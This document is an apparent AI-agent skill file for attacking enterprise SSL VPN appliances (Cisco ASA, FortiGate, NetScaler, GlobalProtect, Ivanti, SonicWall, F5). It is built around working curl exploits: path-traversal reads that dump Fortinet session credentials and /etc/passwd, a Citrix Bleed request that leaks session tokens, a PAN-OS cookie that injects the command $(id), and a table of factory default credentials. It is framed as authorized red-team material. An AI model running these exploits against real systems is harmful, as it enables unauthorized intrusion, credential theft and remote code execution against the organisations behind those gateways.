---
name: enterprise-vpn-attack
description: External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs.
version: 1.1.0
revision_date: 2026-07-25
license: MIT
category: redteam
tags: [vpn, enterprise, attack, redteam]
---

## When to use this skill

Trigger when recon surfaces:
- `*.<client>.example/+CSCOE+/logon.html` or similar `+CSCOE+` paths → Cisco ASA / AnyConnect
- `intranet.*` / `vpn.*` / `connect.*` / `webvpn.*` / `wc.*` / `remote.*` subdomains
- Port 443 returning login pages with `Server: Apache` or banner like "AnyConnect", "FortiGate", "NetScaler", "GlobalProtect", "Pulse", "Ivanti"
- TCP 8443 / 4443 / 10443 / 8888 (common VPN web-mgmt ports)
- HTTP responses with `Set-Cookie: webvpn=` (Cisco) / `SVPNCOOKIE=` (Fortinet) / `NSC_AAA=` (Citrix) / `DSAuthSession=` (Pulse) / `BIGipServer*` (F5)

DO NOT use for:
- Internal lateral-movement post-foothold (out of scope per user's boundary)
- VPN client-side bugs (different attack class)
- IPsec / L2TP / OpenVPN (different protocols, not SSL VPN web stack)

---

## Vendor identification (fingerprinting)

### Cisco ASA / AnyConnect
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/+CSCOE+/logon.html' | head -10
# Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content
# Login page contains: "AnyConnect", "CSCOE", "logon.html"
```
ASA version: not banner-disclosed in modern builds; need to derive from JS file paths or test specific paths.

```bash
# Path-based version hints (older builds leaked builds in URLs)
curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'
curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
curl --max-time 30 --connect-timeout 10 -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint
```

### Fortinet FortiGate / FortiOS
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/remote/login' | head -10
# Look for: Set-Cookie: SVPNCOOKIE=, Server header missing or "xxxxxxxx-xxxxx"
# Login page contains: "FortiGate", "Fortinet", "SSL-VPN"
```
Version: `/remote/info` sometimes leaks (older), or `/login?username=` 302 response

### Citrix NetScaler / ADC / Gateway
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/' | head -10
# Look for: Set-Cookie: NSC_AAA=, Set-Cookie: NSC_USER=, Server: NetScaler
# Login page contains: "NetScaler", "Citrix Gateway"

# Version banner
curl --max-time 30 --connect-timeout 10 -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'
curl --max-time 30 --connect-timeout 10 -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era
```

### Palo Alto GlobalProtect
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/global-protect/login.esp' | head -10
# Look for: Set-Cookie: PHPSESSID= (yes, GP uses PHP), Server: Apache (PA-VM internal)
# Page contains: "GlobalProtect Portal", "PAN-OS"

# Version banner via login page
curl --max-time 30 --connect-timeout 10 -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\s\S]{0,200}'
# Or check meta tag
curl --max-time 30 --connect-timeout 10 -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'
```

### Pulse Secure / Ivanti Connect Secure
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10
# Look for: Set-Cookie: DSAuthSession=, DSPREAUTH=
# Page contains: "Pulse Secure" or "Ivanti Connect Secure"

# Version
curl --max-time 30 --connect-timeout 10 -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'
```

### SonicWall NetExtender / SMA
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/cgi-bin/welcome' | head -10
# Look for: Set-Cookie: swap=, swapauth=
# Page contains: "SonicWall", "NetExtender", "SMA"
```

### F5 Big-IP / APM
```bash
curl --max-time 30 --connect-timeout 10 -skI 'https://target/my.policy' | head -10
# Look for: Set-Cookie: BIGipServer*, MRHSession=
# Server: BIG-IP (sometimes)
```

---

## CVE matrix — pre-auth or auth-bypass (2018-2026)

### Cisco ASA / AnyConnect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-0296** | ASA pre-9.x specific builds | Path traversal — info disclosure (sessions, config) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
| **CVE-2020-3452** | ASA, FTD before specific patch levels | Path traversal — file read | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` and variations |
| **CVE-2023-20269** | ASA, FTD specific | Auth bypass on SSL VPN | Brute-force a group + valid creds combo against `/+webvpn+/index.html` |
| **CVE-2024-20481** | RAVPN | DoS via crafted handshake | **SKIP in red team — disruptive** |

```bash
# Cisco CVE-2020-3452 — file read
curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5

# Cisco CVE-2018-0296 — path traversal
curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20

# Files commonly retrievable on vulnerable ASA:
# /+CSCOE+/portal_inc.lua    (portal inclusions — may reveal local users)
# /+CSCOE+/session_password.html
# /+CSCOE+/files/files.html
```

### Fortinet FortiGate / FortiOS

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-13379** | FortiOS 5.4-6.0 | Path traversal — sslvpn_websession file read | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow — pre-auth RCE | Complex exploit; test with `nuclei` template `CVE-2022-42475` |
| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | Public PoCs exist; nuclei template available |
| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write — pre-auth RCE | Public PoC; nuclei template `CVE-2024-21762` |
| **CVE-2024-55591** | FortiOS 7.0-7.4 | Auth bypass on FortiOS Node.js websocket admin interface | `GET /endpoint` on admin-interface port |

```bash
# Fortinet CVE-2018-13379 — most reliably-fingerprintable file read
curl --max-time 30 --connect-timeout 10 -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
# Response contains plaintext usernames + sessions if vulnerable

# Fortinet credential dump format (from CVE-2018-13379 dumps that hit pastebin in 2021):
# IP:PORT     username     password     (and others)
```

### Citrix NetScaler / ADC / Gateway

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-19781** (Shitrix) | ADC/Gateway 10.5-13.0 specific | Path traversal → RCE via XML upload | `GET /vpn/../vpns/cfg/smb.conf` |
| **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | Complex; test with nuclei |
| **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 specific | Pre-auth RCE via crafted HTTP | Public PoCs exist |
| **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header — long Host header triggers memory leak in response |

```bash
# Citrix Bleed (CVE-2023-4966) detection
HOST=$(python3 -c "print('A' * 24812)")
curl --max-time 30 --connect-timeout 10 -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
# If response is large (>10KB) and contains random memory contents — vulnerable
# Session tokens often present in the memory dump

# CVE-2019-19781 file read
curl --max-time 30 --connect-timeout 10 -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
```

### Palo Alto GlobalProtect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection — pre-auth RCE | `POST /ssl-vpn/login.esp` with crafted Cookie header containing `SESSID=../../../var/log/pan/test.txt` |

```bash
# CVE-2024-3400 detection
curl --max-time 30 --connect-timeout 10 -sk -X POST 'https://target/ssl-vpn/login.esp' \
  -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \
  --data 'jsessionid=test'
# Look for file-creation side-effect on test path — palo creates file with command output
```

### Pulse Secure / Ivanti Connect Secure / Policy Secure

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-11510** | Pulse Connect Secure 8.x-9.x | Arbitrary file read | `GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/` |
| **CVE-2021-22893** | Pulse Connect Secure 9.x | Pre-auth RCE | Complex multi-step; test with nuclei |
| **CVE-2024-21887** | Ivanti Connect Secure 9.1-22.6 | Command injection on web component | `POST /api/v1/totp/user-backup-code/` with crafted body |
| **CVE-2023-46805** | Ivanti Connect Secure 9.1-22.6 | Auth bypass | Combined with 21887 for full chain |

```bash
# CVE-2019-11510 — Pulse file read
curl --max-time 30 --connect-timeout 10 -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
```

### SonicWall

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection — pre-auth | nuclei template available |
| **CVE-2024-40766** | SonicOS specific | Access-control flaw | Specific firmware versions |

---

## SAML SP / IdP misconfigurations (always check)

Most enterprise VPNs now use SAML for SSO. Check SP metadata:

```bash
# Cisco ASA
curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50

# Fortinet
curl --max-time 30 --connect-timeout 10 -sk 'https://target/remote/saml/metadata' | head -50

# Citrix
curl --max-time 30 --connect-timeout 10 -sk 'https://target/saml/login' | head -30
```

Look for:
- `AuthnRequestsSigned="false"` → see `hunt-saml` for XSW exploitation
- `WantAssertionsSigned="false"` → severe; assertion-replay possible
- Audience-restriction validation gaps
- Public SP signing cert (for replay/forging attacks)

---

## Default credentials (test sparingly — lockout risk)

| Vendor | User | Password | Notes |
|---|---|---|---|
| Cisco ASA | admin | cisco | Default factory; rarely seen in prod |
| Cisco ASA | enable_15 | cisco | Console |
| Fortinet | admin | (empty) | Factory default |
| Citrix NetScaler | nsroot | nsroot | Factory default |
| Citrix NetScaler | nsroot | (serial number) | Newer firmware |
| Palo Alto | admin | admin | Factory default |
| Pulse Secure | admin | password | Factory; CIS-hardened changes this |
| F5 Big-IP | root | default | Factory |
| F5 Big-IP | admin | admin | Common alternate |
| SonicWall | admin | password | Factory |

⚠ Most enterprise targets have changed these. Test ≤2 attempts per account to avoid lockout.

---


## 全文导航（已拆分）

主卡保留前 5 节；其余 9 节在 `references/full.md`：

- Group / tunnel-group enumeration (Cisco-specific)
- AAA backend identification
- Common probe sequence (5-minute fingerprint)
- Nuclei templates for fast triage
- Operational discipline
- Verification
- Bridge to neighboring skills
- Pitfalls
- Related Skills & Chains

加载：`skill_view(name='enterprise-vpn-attack', file_path='references/full.md')`
